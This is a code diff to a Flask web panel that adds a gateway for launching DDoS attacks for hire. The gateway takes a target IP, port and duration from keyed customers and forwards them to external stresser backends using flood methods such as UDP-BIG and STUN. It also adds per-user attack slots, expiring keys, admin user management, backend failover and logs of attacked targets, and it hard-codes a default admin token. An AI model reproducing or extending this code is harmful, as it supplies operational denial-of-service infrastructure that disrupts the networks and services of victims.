@@ -4,8 +4,12 @@ import secrets
 import hashlib
 import hmac
 import base64
+import time
+import threading
 import requests
-from datetime import datetime, timedelta
+import concurrent.futures
+from collections import deque, defaultdict
+from datetime import datetime, timedelta, timezone
 from flask import Flask, render_template_string, request, jsonify, session, redirect, url_for, make_response, send_from_directory
 from functools import wraps
 from Crypto.Cipher import AES
@@ -60,14 +64,14 @@ OWNER_PASS = os.getenv('OWNER_PASS', '')
 HMAC_SECRET = os.getenv('HMAC_SECRET', '')
 AES_KEY = os.getenv('AES_KEY', '').encode('utf-8')
 
-# Attack API — INTERNAL ONLY
-ATTACK_API_BASE = os.getenv('ATTACK_API_BASE', '')
-ATTACK_API_KEY = os.getenv('ATTACK_API_KEY', '')
-
-# External Proxy (proxy.py on VPS)
-PROXY_URL = os.getenv('PROXY_URL', '')
+# Attack — via VPS Proxy (same as panel.py)
+ATTACK_PROXY_URL = os.getenv('ATTACK_PROXY_URL', os.getenv('PROXY_URL', ''))
 PROXY_SECRET = os.getenv('PROXY_SECRET', '')
 PROXY_METHOD = os.getenv('PROXY_METHOD', 'STUN')
+
+# Legacy Attack API (kept for backward compat)
+ATTACK_API_BASE = os.getenv('ATTACK_API_BASE', '')
+ATTACK_API_KEY = os.getenv('ATTACK_API_KEY', '')
 
 # MongoDB
 MONGO_URI = os.getenv('MONGO_URI', '')
@@ -77,7 +81,7 @@ MONGO_DB_NAME = os.getenv('MONGO_DB_NAME', 'alonexraj_panel')
 _missing = [k for k, v in {
     'OWNER_USER': OWNER_USER, 'OWNER_PASS': OWNER_PASS,
     'HMAC_SECRET': HMAC_SECRET, 'MONGO_URI': MONGO_URI,
-    'PROXY_URL': PROXY_URL,
+    'ATTACK_PROXY_URL': ATTACK_PROXY_URL,
 }.items() if not v]
 if _missing:
     print(f"[! WARN] Missing env vars: {', '.join(_missing)}. Configure them in env to enable full functionality.")
@@ -95,14 +99,367 @@ config_col = db['config'] if db is not None else None
 # Credit rate: 10 credits = 1 hour
 CREDITS_PER_HOUR = int(os.environ.get('CREDITS_PER_HOUR', '10'))
 
+# ══════════════════════════════════════════════════════════════════
+# VK ATTACK API — Multi-Backend Gateway (from server.py)
+# ══════════════════════════════════════════════════════════════════
+VK_ADMIN_TOKEN = os.getenv('VK_ADMIN_TOKEN', os.getenv('ADMIN_TOKEN', 'VISHALPAPAHU'))
+VK_MAX_DURATION = int(os.getenv('VK_MAX_DURATION', os.getenv('MAX_DURATION', '300')))
+VK_RATE_LIMIT_PER_MIN = int(os.getenv('VK_RATE_LIMIT_PER_MIN', os.getenv('RATE_LIMIT_PER_MIN', '30')))
+VK_REAL_METHOD = os.getenv('REAL_METHOD', 'UDP-BIG')
+
+# VK MongoDB (uses same connection, separate DB if configured)
+VK_DB_NAME = os.getenv('VK_MONGO_DB_NAME', os.getenv('MONGO_DB_NAME_VK', 'vk_gateway'))
+vk_db = mongo_client[VK_DB_NAME] if mongo_client else None
+vk_users_col = vk_db['users'] if vk_db is not None else None
+vk_audit_col = vk_db['audit_log'] if vk_db is not None else None
+
+
+def _parse_extra_params(s):
+    if not s:
+        return {}
+    params = {}
+    for pair in s.split(','):
+        if '=' in pair:
+            k, v = pair.split('=', 1)
+            params[k.strip()] = v.strip()
+    return params
+
+
+def _build_api(prefix, defaults):
+    if not os.getenv(f'{prefix}_BASE'):
+        return None
+    return {
+        'name': os.getenv(f'{prefix}_NAME', defaults.get('name', 'API')),
+        'base_url': os.getenv(f'{prefix}_BASE'),
+        'api_key': os.getenv(f'{prefix}_KEY', ''),
+        'path': os.getenv(f'{prefix}_PATH', defaults.get('path', '/api/attack')),
+        'host_param': os.getenv(f'{prefix}_HOST_PARAM', defaults.get('host_param', 'host')),
+        'key_param': os.getenv(f'{prefix}_KEY_PARAM', defaults.get('key_param', 'key')),
+        'method_param': os.getenv(f'{prefix}_METHOD_PARAM', 'method'),
+        'port_param': os.getenv(f'{prefix}_PORT_PARAM', 'port'),
+        'time_param': os.getenv(f'{prefix}_TIME_PARAM', defaults.get('time_param', 'time')),
+        'http_method': os.getenv(f'{prefix}_HTTP_METHOD', 'GET').upper(),
+        'default_method': os.getenv(f'{prefix}_DEFAULT_METHOD', defaults.get('default_method', 'UDP-BIG')),
+        'timeout': int(os.getenv(f'{prefix}_TIMEOUT', '12')),
+        'priority': int(os.getenv(f'{prefix}_PRIORITY', defaults.get('priority', '1'))),
+        'enabled': os.getenv(f'{prefix}_ENABLED', 'true').lower() == 'true',
+        'extra_params': _parse_extra_params(os.getenv(f'{prefix}_EXTRA_PARAMS', '')),
+        'max_concurrent': int(os.getenv(f'{prefix}_MAX_CONCURRENT', '1')),
+        'team': os.getenv(f'{prefix}_TEAM', defaults.get('team', 'A')),
+    }
+
+
+def _build_api_list():
+    apis = []
+    configs = [
+        ('API1', {'name': 'SatelliteStress', 'path': '/api/v1/attack/start', 'host_param': 'host', 'key_param': 'key', 'time_param': 'time', 'default_method': 'UDP-BIG', 'priority': '2', 'team': 'B'}),
+        ('API2', {'name': 'RetroStress', 'path': '/api/start', 'host_param': 'target', 'key_param': 'key', 'time_param': 'time', 'default_method': 'STUN', 'priority': '1', 'team': 'A'}),
+        ('API3', {'name': 'TeamC2', 'path': '/api/attack', 'host_param': 'target', 'key_param': 'api_key', 'time_param': 'time', 'default_method': 'UDP-BIG', 'priority': '3', 'team': 'A'}),
+        ('API4', {'name': 'CustomAPI', 'path': '/api/attack', 'host_param': 'host', 'key_param': 'key', 'time_param': 'time', 'default_method': 'UDP-BIG', 'priority': '4', 'team': 'A'}),
+    ]
+    for prefix, defaults in configs:
+        api = _build_api(prefix, defaults)
+        if api and api['enabled']:
+            apis.append(api)
+    apis.sort(key=lambda x: x['priority'])
+    return apis
+
+
+VK_API_LIST = _build_api_list()
+
+_vk_rr_lock = threading.Lock()
+_vk_rr_index = 0
+_vk_api_health = defaultdict(lambda: {'status': 'unknown', 'last_success': 0, 'last_fail': 0, 'fail_count': 0})
+
+# Slot tracker
+_vk_slot_lock = threading.Lock()
+vk_active_slots = defaultdict(list)
+
+# Rate limiter for VK
+_vk_rate_lock = threading.Lock()
+_vk_rate_buckets = defaultdict(deque)
+
+# Request log + stats
+vk_request_log = deque(maxlen=500)
+_vk_stats = {'total': 0, 'success': 0, 'failed': 0, 'denied': 0, 'rate_limited': 0}
+
+
+def vk_cleanup_expired(key):
+    now_t = time.time()
+    vk_active_slots[key] = [s for s in vk_active_slots[key] if s['expires_at'] > now_t]
+
+
+def vk_get_user(key):
+    if vk_users_col is None:
+        return None
+    user = vk_users_col.find_one({'key': key}, {'_id': 0})
+    if not user:
+        return None
+    expires_at = user.get('expires_at')
+    if expires_at:
+        try:
+            exp_dt = datetime.fromisoformat(expires_at.replace('Z', '+00:00'))
+            if datetime.now(timezone.utc) > exp_dt:
+                vk_users_col.update_one({'key': key}, {'$set': {'enabled': False, 'expired': True}})
+                user['enabled'] = False
+                user['expired'] = True
+        except Exception:
+            pass
+    return user
+
+
+def vk_get_slot_usage(key, user=None):
+    if user is None:
+        user = vk_get_user(key)
+    if not user:
+        return 0, 0, 0
+    with _vk_slot_lock:
+        vk_cleanup_expired(key)
+        active = len(vk_active_slots[key])
+    max_s = user.get('slots', 0)
+    return active, max_s, max(max_s - active, 0)
+
+
+def vk_reserve_slot(key, target, duration_sec, max_slots):
+    with _vk_slot_lock:
+        vk_cleanup_expired(key)
+        if len(vk_active_slots[key]) >= max_slots:
+            return None
+        now_t = time.time()
+        slot_id = f"s_{int(now_t * 1000)}_{secrets.token_hex(3)}"
+        vk_active_slots[key].append({
+            'slot_id': slot_id,
+            'started_at': now_t,
+            'expires_at': now_t + duration_sec + 5,
+            'target': target,
+        })
+        return slot_id
+
+
+def vk_release_slot(key, slot_id):
+    with _vk_slot_lock:
+        vk_active_slots[key] = [s for s in vk_active_slots[key] if s['slot_id'] != slot_id]
+
+
+def vk_check_rate_limit(ip):
+    now_t = time.time()
+    with _vk_rate_lock:
+        bucket = _vk_rate_buckets[ip]
+        while bucket and bucket[0] < now_t - 60:
+            bucket.popleft()
+        if len(bucket) >= VK_RATE_LIMIT_PER_MIN:
+            return False
+        bucket.append(now_t)
+        return True
+
+
+def vk_log_request(endpoint, key, params, status, message, slot_info=''):
+    user = vk_get_user(key) if key else None
+    vk_request_log.appendleft({
+        'time': datetime.utcnow().isoformat() + 'Z',
+        'endpoint': endpoint,
+        'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
+        'key_short': (key[:18] + '...') if key else '-',
+        'user': user.get('name', '-') if user else '-',
+        'params': dict(params) if params else {},
+        'status': status,
+        'message': message[:200],
+        'slot_info': slot_info,
+    })
+    _vk_stats['total'] += 1
+    if status in ('queued', 'success'):
+        _vk_stats['success'] += 1
+    elif status == 'denied':
+        _vk_stats['denied'] += 1
+    elif status == 'rate_limited':
+        _vk_stats['rate_limited'] += 1
+    else:
+        _vk_stats['failed'] += 1
+
+
+def vk_audit_log(action, admin_ip, details):
+    if vk_audit_col is None:
+        return
+    try:
+        vk_audit_col.insert_one({
+            'time': datetime.utcnow().isoformat() + 'Z',
+            'action': action,
+            'admin_ip': admin_ip,
+            'details': details,
+        })
+    except Exception:
+        pass
+
+
+def vk_call_api(api_config, ip, port, time_sec, method, retry=1):
+    """Call API with retry. Returns (success, result_dict)."""
+    name = api_config['name']
+    actual_method = method or api_config['default_method']
+
+    for attempt in range(retry + 1):
+        try:
+            params = {
+                api_config['key_param']: api_config['api_key'],
+                api_config['host_param']: ip,
+                api_config['port_param']: port,
+                api_config['time_param']: time_sec,
+                api_config['method_param']: actual_method,
+            }
+            if api_config.get('extra_params'):
+                params.update(api_config['extra_params'])
+
+            url = f"{api_config['base_url']}{api_config['path']}"
+            headers = {'User-Agent': 'Mozilla/5.0'}
+
+            if api_config['http_method'] == 'GET':
+                r = requests.get(url, params=params, timeout=api_config['timeout'], headers=headers)
+            else:
+                r = requests.post(url, json=params, timeout=api_config['timeout'], headers=headers)
+
+            try:
+                resp = r.json()
+            except Exception:
+                resp = {'raw': r.text}
+
+            if r.status_code in (200, 201, 202):
+                ok = (
+                    resp.get('success') is True
+                    or str(resp.get('status', '')).lower() in ('success', 'queued', 'ok', 'sent', 'launched')
+                    or (resp.get('error') is None and resp.get('errors') is None and 'attack' in str(resp).lower())
+                )
+                if ok:
+                    _vk_api_health[name]['status'] = 'healthy'
+                    _vk_api_health[name]['last_success'] = time.time()
+                    _vk_api_health[name]['fail_count'] = 0
+                    return True, {'message': 'OK', 'api': name}
+
+            if attempt < retry:
+                time.sleep(0.1)
+                continue
+
+            _vk_api_health[name]['fail_count'] += 1
+            _vk_api_health[name]['last_fail'] = time.time()
+            return False, {'message': resp.get('error') or resp.get('message') or f'{name} HTTP {r.status_code}'}
+
+        except requests.exceptions.Timeout:
+            if attempt < retry:
+                time.sleep(0.1)
+                continue
+            _vk_api_health[name]['status'] = 'timeout'
+            _vk_api_health[name]['fail_count'] += 1
+            _vk_api_health[name]['last_fail'] = time.time()
+            return False, {'message': f'{name} timeout'}
+        except Exception as e:
+            if attempt < retry:
+                time.sleep(0.1)
+                continue
+            _vk_api_health[name]['status'] = 'error'
+            _vk_api_health[name]['fail_count'] += 1
+            _vk_api_health[name]['last_fail'] = time.time()
+            return False, {'message': f'{name}: {e}'}
+
+    return False, {'message': f'{name}: all retries failed'}
+
+
+def vk_fire_attack(ip, port, time_sec, method):
+    """Priority-based sequential fire with fallback."""
+    if not VK_API_LIST:
+        return False, 'No APIs configured'
+
+    sorted_apis = sorted(VK_API_LIST, key=lambda x: x.get('priority', 99))
+
+    for api_cfg in sorted_apis:
+        name = api_cfg['name']
+        h = _vk_api_health[name]
+
+        if h['fail_count'] >= 10 and (time.time() - h['last_fail']) < 60:
+            continue
+
+        success, result = vk_call_api(api_cfg, ip, port, time_sec, method, retry=1)
+        if success:
+            return True, result
+
+    return False, 'All APIs failed'
+
+
+def vk_handle_attack(endpoint_name, params):
+    """Core attack handler for VK API endpoints."""
+    key = params.get('key', '').strip()
+    target = params.get('ip', '').strip() or params.get('host', '').strip() or params.get('target', '').strip()
+    port = params.get('port', '').strip()
+    time_sec = params.get('time', '').strip()
+    method_input = params.get('method', 'VISHAL').strip()
+
+    METHOD_MAP = {'VISHAL': VK_REAL_METHOD}
+    real_method = METHOD_MAP.get(method_input.upper(), method_input)
+    display_method = method_input
+
+    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if not vk_check_rate_limit(client_ip):
+        vk_log_request(endpoint_name, key, params, 'rate_limited', 'Too many requests')
+        return jsonify({'success': False, 'status': 'error', 'message': 'Rate limited'}), 429
+
+    user = vk_get_user(key) if key else None
+    if not user:
+        vk_log_request(endpoint_name, key, params, 'denied', 'Invalid API key')
+        return jsonify({'success': False, 'status': 'error', 'message': 'Invalid API key'}), 401
+
+    if not user.get('enabled', True):
+        if user.get('expired'):
+            return jsonify({'success': False, 'status': 'error', 'message': 'API key expired. Contact admin to renew.'}), 403
+        return jsonify({'success': False, 'status': 'error', 'message': 'Account disabled'}), 403
+
+    if not target or not port or not time_sec:
+        return jsonify({'success': False, 'status': 'error', 'message': 'Missing params (ip, port, time)'}), 400
+
+    try:
+        duration = int(time_sec)
+        if duration <= 0:
+            raise ValueError
+        if duration > VK_MAX_DURATION:
+            return jsonify({'success': False, 'status': 'error', 'message': f'Max duration is {VK_MAX_DURATION}s'}), 400
+    except Exception:
+        return jsonify({'success': False, 'status': 'error', 'message': 'time must be positive integer'}), 400
+
+    max_slots = user.get('slots', 0)
+    slot_id = vk_reserve_slot(key, f"{target}:{port}", duration, max_slots)
+    if slot_id is None:
+        active, _, _ = vk_get_slot_usage(key, user)
+        return jsonify({
+            'success': False, 'status': 'error',
+            'message': f'Slot limit reached ({active}/{max_slots})',
+            'slots': {'active': active, 'max': max_slots, 'available': 0},
+        }), 429
+
+    ok, result = vk_fire_attack(target, port, str(duration), real_method)
+
+    if not ok:
+        time.sleep(0.2)
+        ok, result = vk_fire_attack(target, port, str(duration), real_method)
+
+    if ok:
+        active, _, remaining = vk_get_slot_usage(key, user)
+        vk_log_request(endpoint_name, key, params, 'queued', 'Attack launched', f"{active}/{max_slots}")
+        return jsonify({
+            'success': True,
+            'status': 'queued',
+            'message': f'Attack sent to {target}:{port} for {duration}s',
+            'target': f"{target}:{port}",
+            'method': display_method,
+            'duration': duration,
+            'user': user.get('name', '-'),
+            'slots': {'active': active, 'max': max_slots, 'available': remaining},
+        })
+
+    vk_release_slot(key, slot_id)
+    vk_log_request(endpoint_name, key, params, 'failed', 'Attack failed')
+    return jsonify({'success': False, 'status': 'error', 'message': 'Attack failed. Try again.'}), 502
+
 
 # ══════════════════════════════════════════════════════════════════
 # DATA HELPERS — MongoDB
 # ══════════════════════════════════════════════════════════════════
 # Keep alive thread for Render free tier
-import threading
-import time
-import requests
 
 def keep_alive_ping():
     """Background thread to ping the app every 4 minutes"""
@@ -233,16 +590,16 @@ def encrypted_reply(data_dict):
 def proxy_attack(ip, port, time_sec):
     """
     Forward attack request to VPS proxy — single request, STUN method.
+    Same as panel.py — posts to ATTACK_PROXY_URL with secret.
     """
     try:
-        payload = {
-            "secret": PROXY_SECRET,
-            "ip": ip,
-            "port": port,
-            "time": time_sec,
-            "method": PROXY_METHOD,
-        }
-        r = requests.post(PROXY_URL, json=payload, timeout=15)
+        r = requests.post(ATTACK_PROXY_URL, json={
+            'secret': PROXY_SECRET,
+            'ip': ip,
+            'port': port,
+            'time': time_sec,
+            'method': PROXY_METHOD
+        }, timeout=15)
         if r.status_code == 200:
             data = r.json()
             if data.get("status") == "queued":
@@ -251,7 +608,6 @@ def proxy_attack(ip, port, time_sec):
                     "status": "queued",
                     "message": data.get("message", "⚡ Attack Launched!"),
                     "target": f"{ip}:{port}",
-                    "method": PROXY_METHOD,
                     "slots": {"active": launched, "available": max(8 - launched, 0), "max": 8},
                 }
             return {"status": "error", "message": data.get("message", "Attack failed")}
@@ -276,8 +632,7 @@ def get_client_ip():
 # ══════════════════════════════════════════════════════════════════
 # RATE LIMITER (in-memory, per-IP) — login brute-force protection
 # ══════════════════════════════════════════════════════════════════
-import time as _time_mod
-from collections import defaultdict
+_time_mod = time
 _login_attempts = defaultdict(list)   # ip -> [timestamp, ...]
 _login_lockouts = {}                  # ip -> unlock_timestamp
 
@@ -1733,6 +2088,325 @@ def upload_apk():
     }
     save_update_config(config)
     return jsonify({'status': 'success', 'filename': filename})
+
+
+# ══════════════════════════════════════════════════════════════════
+# VK API ROUTES — Multi-Backend Attack Gateway
+# ══════════════════════════════════════════════════════════════════
+
+def _vk_admin_check():
+    tok = request.headers.get('X-Admin-Token') or request.args.get('token', '')
+    return hmac.compare_digest(tok or '', VK_ADMIN_TOKEN)
+
+
+def _vk_admin_ip():
+    return request.headers.get('X-Forwarded-For', request.remote_addr)
+
+
+def _vk_generate_key():
+    return f"vk_{secrets.token_urlsafe(24)}"
+
+
+# ─── User Attack Endpoints ──────────────────────────────────────
+
+@app.route('/vk/launch')
+def vk_launch():
+    return vk_handle_attack('/vk/launch', request.args)
+
+
+@app.route('/api/start')
+def vk_api_start():
+    return vk_handle_attack('/api/start', request.args)
+
+
+@app.route('/api/v1/attack/start')
+def vk_api_v1_start():
+    return vk_handle_attack('/api/v1/attack/start', request.args)
+
+
+@app.route('/vk/slots')
+def vk_slots():
+    key = request.args.get('key', '').strip()
+    user = vk_get_user(key) if key else None
+    if not user:
+        return jsonify({'error': 'Invalid API key'}), 401
+    if user.get('expired'):
+        return jsonify({'error': 'API key expired. Contact admin to renew.'}), 403
+    active, max_s, remaining = vk_get_slot_usage(key, user)
+    with _vk_slot_lock:
+        active_list = list(vk_active_slots[key])
+    now_t = time.time()
+    resp = {
+        'user': user.get('name', '-'),
+        'max_slots': max_s,
+        'active': active,
+        'available': remaining,
+        'active_attacks': [
+            {'target': s['target'], 'remaining_sec': max(int(s['expires_at'] - now_t), 0)}
+            for s in active_list
+        ],
+    }
+    if user.get('expires_at'):
+        resp['expires_at'] = user['expires_at']
+        try:
+            exp_dt = datetime.fromisoformat(user['expires_at'].replace('Z', '+00:00'))
+            resp['days_remaining'] = max((exp_dt - datetime.now(timezone.utc)).days, 0)
+        except Exception:
+            pass
+    else:
+        resp['expires_at'] = 'unlimited'
+    return jsonify(resp)
+
+
+@app.route('/api/slots')
+def vk_api_slots():
+    return vk_slots()
+
+
+# ─── Admin Endpoints ────────────────────────────────────────────
+
+@app.route('/admin/add-user', methods=['POST'])
+def vk_admin_add_user():
+    if not _vk_admin_check():
+        return jsonify({'error': 'Unauthorized'}), 401
+    if vk_users_col is None:
+        return jsonify({'error': 'Database not configured'}), 503
+
+    data = request.get_json(silent=True) or {}
+    name = (data.get('name') or '').strip()
+    try:
+        slots = int(data.get('slots', 0))
+    except Exception:
+        return jsonify({'error': 'slots must be integer'}), 400
+    if not name or slots <= 0:
+        return jsonify({'error': 'name and slots (>0) required'}), 400
+
+    days = data.get('days')
+    expires_at = None
+    if days:
+        try:
+            days = int(days)
+            if days <= 0:
+                raise ValueError
+            expires_at = (datetime.now(timezone.utc) + timedelta(days=days)).isoformat().replace('+00:00', 'Z')
+        except Exception:
+            return jsonify({'error': 'days must be positive integer'}), 400
+
+    custom_key = (data.get('key') or '').strip()
+    if custom_key:
+        if not custom_key.startswith('vk_') or len(custom_key) < 8:
+            return jsonify({'error': 'key must start with vk_ and be >= 8 chars'}), 400
+        if vk_users_col.find_one({'key': custom_key}):
+            return jsonify({'error': 'key already exists'}), 409
+        new_key = custom_key
+    else:
+        for _ in range(5):
+            new_key = _vk_generate_key()
+            if not vk_users_col.find_one({'key': new_key}):
+                break
+        else:
+            return jsonify({'error': 'Could not generate unique key'}), 500
+
+    user = {
+        'key': new_key, 'name': name, 'slots': slots,
+        'created_at': datetime.utcnow().isoformat() + 'Z',
+        'created_by_ip': _vk_admin_ip(), 'enabled': True,
+    }
+    if expires_at:
+        user['expires_at'] = expires_at
+        user['days'] = days
+
+    vk_users_col.insert_one(user)
+    user.pop('_id', None)
+    vk_audit_log('add_user', _vk_admin_ip(), {'name': name, 'slots': slots, 'days': days or 'unlimited'})
+    return jsonify({'success': True, 'user': user})
+
+
+@app.route('/admin/update-user', methods=['POST'])
+def vk_admin_update_user():
+    if not _vk_admin_check():
+        return jsonify({'error': 'Unauthorized'}), 401
+    if vk_users_col is None:
+        return jsonify({'error': 'Database not configured'}), 503
+
+    data = request.get_json(silent=True) or {}
+    key = (data.get('key') or '').strip()
+    if not key:
+        return jsonify({'error': 'key is required'}), 400
+    if not vk_users_col.find_one({'key': key}):
+        return jsonify({'error': 'user not found'}), 404
+
+    updates = {}
+    if 'name' in data and str(data['name']).strip():
+        updates['name'] = str(data['name']).strip()
+    if 'slots' in data:
+        try:
+            s = int(data['slots'])
+            if s <= 0:
+                raise ValueError
+            updates['slots'] = s
+        except Exception:
+            return jsonify({'error': 'slots must be positive integer'}), 400
+    if 'enabled' in data:
+        updates['enabled'] = bool(data['enabled'])
+    if 'days' in data:
+        try:
+            d = int(data['days'])
+            if d <= 0:
+                raise ValueError
+            updates['expires_at'] = (datetime.now(timezone.utc) + timedelta(days=d)).isoformat().replace('+00:00', 'Z')
+            updates['days'] = d
+            updates['enabled'] = True
+            updates['expired'] = False
+        except Exception:
+            return jsonify({'error': 'days must be positive integer'}), 400
+    if not updates:
+        return jsonify({'error': 'nothing to update'}), 400
+
+    updates['updated_at'] = datetime.utcnow().isoformat() + 'Z'
+    vk_users_col.update_one({'key': key}, {'$set': updates})
+    vk_audit_log('update_user', _vk_admin_ip(), {'key': key[:18] + '...', 'updates': updates})
+    new_user = vk_users_col.find_one({'key': key}, {'_id': 0})
+    return jsonify({'success': True, 'user': new_user})
+
+
+@app.route('/admin/delete-user', methods=['POST'])
+def vk_admin_delete_user():
+    if not _vk_admin_check():
+        return jsonify({'error': 'Unauthorized'}), 401
+    if vk_users_col is None:
+        return jsonify({'error': 'Database not configured'}), 503
+
+    data = request.get_json(silent=True) or {}
+    key = (data.get('key') or '').strip()
+    if not key:
+        return jsonify({'error': 'key is required'}), 400
+    res = vk_users_col.delete_one({'key': key})
+    if res.deleted_count == 0:
+        return jsonify({'error': 'user not found'}), 404
+    with _vk_slot_lock:
+        vk_active_slots.pop(key, None)
+    vk_audit_log('delete_user', _vk_admin_ip(), {'key': key[:18] + '...'})
+    return jsonify({'success': True, 'message': 'User deleted'})
+
+
+@app.route('/admin/reset-slots', methods=['POST'])
+def vk_admin_reset_slots():
+    if not _vk_admin_check():
+        return jsonify({'error': 'Unauthorized'}), 401
+    data = request.get_json(silent=True) or {}
+    key = (data.get('key') or '').strip()
+    if not key:
+        return jsonify({'error': 'key is required'}), 400
+    with _vk_slot_lock:
+        vk_active_slots.pop(key, None)
+    vk_audit_log('reset_slots', _vk_admin_ip(), {'key': key[:18] + '...'})
+    return jsonify({'success': True, 'message': 'Slots cleared'})
+
+
+@app.route('/admin/list-users')
+def vk_admin_list_users():
+    if not _vk_admin_check():
+        return jsonify({'error': 'Unauthorized'}), 401
+    if vk_users_col is None:
+        return jsonify({'error': 'Database not configured'}), 503
+    users = list(vk_users_col.find({}, {'_id': 0}))
+    now_t = time.time()
+    out = []
+    for u in users:
+        k = u['key']
+        with _vk_slot_lock:
+            vk_cleanup_expired(k)
+            atks = list(vk_active_slots[k])
+        out.append({
+            **u,
+            'key_short': k[:18] + '...',
+            'active': len(atks),
+            'attacks': [{'target': a['target'], 'remaining_sec': max(int(a['expires_at'] - now_t), 0)} for a in atks],
+        })
+    return jsonify({'total': len(out), 'users': out})
+
+
+@app.route('/admin/audit-log')
+def vk_admin_audit_log_view():
+    if not _vk_admin_check():
+        return jsonify({'error': 'Unauthorized'}), 401
+    if vk_audit_col is None:
+        return jsonify({'error': 'Database not configured'}), 503
+    logs = list(vk_audit_col.find({}, {'_id': 0}).sort('time', -1).limit(100))
+    return jsonify({'total': len(logs), 'logs': logs})
+
+
+@app.route('/admin/api-health')
+def vk_admin_api_health():
+    if not _vk_admin_check():
+        return jsonify({'error': 'Unauthorized'}), 401
+    now_t = time.time()
+    apis = []
+    for api_cfg in VK_API_LIST:
+        h = _vk_api_health[api_cfg['name']]
+        apis.append({
+            'name': api_cfg['name'], 'team': api_cfg['team'],
+            'health': h['status'], 'fail_count': h['fail_count'],
+            'circuit_open': h['fail_count'] >= 10 and (now_t - h['last_fail']) < 60,
+        })
+    return jsonify({'apis': apis, 'stats': dict(_vk_stats)})
+
+
+@app.route('/vk/apis')
+def vk_list_apis():
+    if not _vk_admin_check():
+        return '', 404
+    return jsonify({
+        'apis': [{'name': a['name'], 'team': a['team'], 'health': _vk_api_health[a['name']]['status']} for a in VK_API_LIST],
+    })
+
+
+@app.route('/vk/logs')
+def vk_logs_view():
+    if not _vk_admin_check():
+        return '', 404
+    VK_LOGS_TEMPLATE = '''<!doctype html><html><head><meta charset="utf-8"><title>VK Logs</title>
+<style>
+body{font-family:'Segoe UI',sans-serif;background:#0f1117;color:#f3f4f6;margin:0;padding:24px}
+h1{color:#818cf8;font-size:22px;margin-bottom:6px}
+table{width:100%;border-collapse:collapse;background:#1a1d2e;border-radius:8px;overflow:hidden;margin-top:16px}
+th{text-align:left;padding:10px 14px;font-size:11px;color:#9ca3af;text-transform:uppercase;background:#252938}
+td{padding:9px 14px;font-size:12px;border-bottom:1px solid #252938;color:#e5e7eb}
+.queued{color:#10b981;font-weight:700}.denied{color:#fbbf24;font-weight:700}.failed{color:#f87171;font-weight:700}
+.mono{font-family:monospace;font-size:11px;color:#a78bfa}
+</style></head><body>
+<h1>VK Server Logs</h1>
+<table><thead><tr><th>Time</th><th>User</th><th>Target</th><th>Status</th><th>Slots</th><th>Message</th></tr></thead>
+<tbody>{% for log in logs %}<tr>
+<td class="mono">{{ log.time[11:19] }}</td><td>{{ log.user }}</td>
+<td>{{ log.params.get('ip') or log.params.get('host') or log.params.get('target','') }}:{{ log.params.get('port','') }}</td>
+<td class="{{ log.status }}">{{ log.status|upper }}</td><td class="mono">{{ log.slot_info }}</td>
+<td>{{ log.message[:60] }}</td></tr>{% else %}<tr><td colspan="6" style="text-align:center;padding:40px;color:#6b7280">No requests yet</td></tr>{% endfor %}
+</tbody></table></body></html>'''
+    return render_template_string(VK_LOGS_TEMPLATE, logs=list(vk_request_log))
+
+
+# ─── VK Health Checker Background Thread ────────────────────────
+
+def _vk_health_checker():
+    """Reset circuit breakers after cooldown."""
+    while True:
+        time.sleep(60)
+        now_t = time.time()
+        for api_cfg in VK_API_LIST:
+            h = _vk_api_health[api_cfg['name']]
+            if h['fail_count'] >= 10 and (now_t - h['last_fail']) >= 60:
+                h['fail_count'] = 0
+                h['status'] = 'unknown'
+
+
+# Start VK health checker thread
+if VK_API_LIST:
+    threading.Thread(target=_vk_health_checker, daemon=True).start()
+    print(f"[✓ VK API] Loaded {len(VK_API_LIST)} backends: {', '.join(a['name'] for a in VK_API_LIST)}")
+else:
+    print("[! VK API] No API backends configured (set API1_BASE, API2_BASE, etc.)")
 
 
 start_keep_alive()
